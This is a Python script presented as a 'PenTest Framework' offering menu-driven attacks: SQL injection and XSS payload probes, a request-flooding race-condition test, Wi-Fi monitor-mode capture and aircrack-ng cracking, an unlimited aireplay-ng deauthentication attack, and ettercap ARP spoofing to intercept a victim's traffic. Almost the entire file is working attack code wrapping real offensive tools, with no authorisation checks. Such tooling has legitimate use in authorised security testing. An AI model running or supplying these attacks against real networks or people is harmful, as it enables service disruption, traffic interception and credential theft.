import os
import subprocess
import requests
import threading
from urllib.parse import urljoin, urlencode
from termcolor import colored
from bs4 import BeautifulSoup

# Global settings
TARGET_URL = ""  # Placeholder for target URL
SESSION = requests.Session()
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}

# Function to display the main banner
def display_banner():
    banner = "PenTest Framework"
    print(colored(banner, "cyan"))
    print(colored("=" * 70, "green"))

# --- Sub-functions for Web Application Testing ---
def test_race_condition(url, param_name, value):
    def send_request():
        data = {param_name: value}
        response = SESSION.post(url, data=data, headers=HEADERS)
        print(f"Race Condition Attempt - Status: {response.status_code}")

    threads = []
    for _ in range(10):  # 10 simultaneous requests
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def test_sql_injection(url, param_name):
    payload = "' OR 1=1 --"
    params = {param_name: payload}
    full_url = f"{url}?{urlencode(params)}"
    response = SESSION.get(full_url, headers=HEADERS)
    
    if "error" in response.text.lower():
        print("SQL Injection vulnerability found!")
    else:
        print("No SQL Injection vulnerability detected.")

def test_cross_site_scripting(url, param_name):
    payload = "<script>alert('XSS')</script>"
    params = {param_name: payload}
    full_url = f"{url}?{urlencode(params)}"
    response = SESSION.get(full_url, headers=HEADERS)

    if payload in response.text:
        print("XSS vulnerability found!")
    else:
        print("No XSS vulnerability detected.")

# --- Sub-functions for Wi-Fi & Network Attacks ---
def wifi_attack_options():
    print(colored("[Wi-Fi Attack Options]", "magenta"))
    print("[1] Set Interface to Monitor Mode")
    print("[2] Start Aircrack-ng Capture")
    print("[3] Perform Wi-Fi Deauthentication Attack")
    print("[4] Back to Main Menu")

    choice = input(colored("\nEnter your choice: ", "yellow"))
    
    if choice == '1':
        set_interface_monitor_mode()
    elif choice == '2':
        start_aircrack_ng()
    elif choice == '3':
        wifi_deauth_attack()
    elif choice == '4':
        return
    else:
        print(colored("Invalid choice, try again.", "red"))

def set_interface_monitor_mode():
    interface = input(colored("\nEnter the wireless interface (e.g., wlan0): ", "yellow"))
    print(f"Setting {interface} to monitor mode...")
    subprocess.run(["airmon-ng", "start", interface])

def start_aircrack_ng():
    interface = input(colored("\nEnter the interface for packet capture (e.g., wlan0mon): ", "yellow"))
    capture_file = input(colored("Enter the capture file name (e.g., capture.cap): ", "yellow"))
    print(f"Starting Aircrack-ng on {interface}...")
    subprocess.run(["airodump-ng", interface, "--output", capture_file])
    print(f"Packet capture started and saved to {capture_file}. Now running Aircrack-ng on {capture_file}...")
    subprocess.run(["aircrack-ng", capture_file])

def wifi_deauth_attack():
    target = input(colored("\nEnter the target AP MAC address: ", "yellow"))
    client = input(colored("Enter the target client MAC address: ", "yellow"))
    interface = input(colored("Enter the interface in monitor mode (e.g., wlan0mon): ", "yellow"))
    print(f"Performing deauthentication attack on {target} targeting {client}...")
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target, "-c", client, interface])

# --- Sub-functions for MITM Attacks ---
def mitm_attack_options():
    print(colored("[MITM Attack Options]", "magenta"))
    print("[1] Start Ettercap ARP Spoofing")
    print("[2] Back to Main Menu")

    choice = input(colored("\nEnter your choice: ", "yellow"))
    
    if choice == '1':
        start_ettercap_mitm()
    elif choice == '2':
        return
    else:
        print(colored("Invalid choice, try again.", "red"))

def start_ettercap_mitm():
    victim_ip = input(colored("\nEnter victim IP: ", "yellow"))
    gateway_ip = input(colored("Enter gateway IP: ", "yellow"))
    interface = input(colored("Enter the interface (e.g., eth0): ", "yellow"))
    print(f"Starting ARP spoofing on {interface} to intercept traffic from {victim_ip}...")
    subprocess.run(["ettercap", "-T", "-q", "-i", interface, "-M", "ARP", f"/{victim_ip}/", f"/{gateway_ip}/"])

# --- Main Menu and Sub-options ---
def main_menu():
    display_banner()
    while True:
        print("[1] Web Application Testing")
        print("[2] Wi-Fi & Network Attacks")
        print("[3] MITM Attacks")
        print("[4] Exit Framework")

        choice = input(colored("\nEnter your choice: ", "yellow"))

        if choice == '1':
            web_app_testing_options()
        elif choice == '2':
            wifi_attack_options()
        elif choice == '3':
            mitm_attack_options()
        elif choice == '4':
            print(colored("Exiting... Thank you for using the toolkit!", "red"))
            break
        else:
            print(colored("Invalid choice, please select a valid option.", "red"))

# --- Web Application Testing Sub-menu ---
def web_app_testing_options():
    print(colored("[Web Application Testing]", "magenta"))
    print("[1] Test for SQL Injection")
    print("[2] Test for XSS Vulnerability")
    print("[3] Test for Race Condition")
    print("[4] Back to Main Menu")

    choice = input(colored("\nEnter your choice: ", "yellow"))
    
    if choice == '1':
        test_sql_injection(TARGET_URL, "param1")
    elif choice == '2':
        test_cross_site_scripting(TARGET_URL, "param1")
    elif choice == '3':
        test_race_condition(TARGET_URL, "param1", "value")
    elif choice == '4':
        return
    else:
        print(colored("Invalid choice, try again.", "red"))

# Run the main menu
if __name__ == "__main__":
    main_menu()
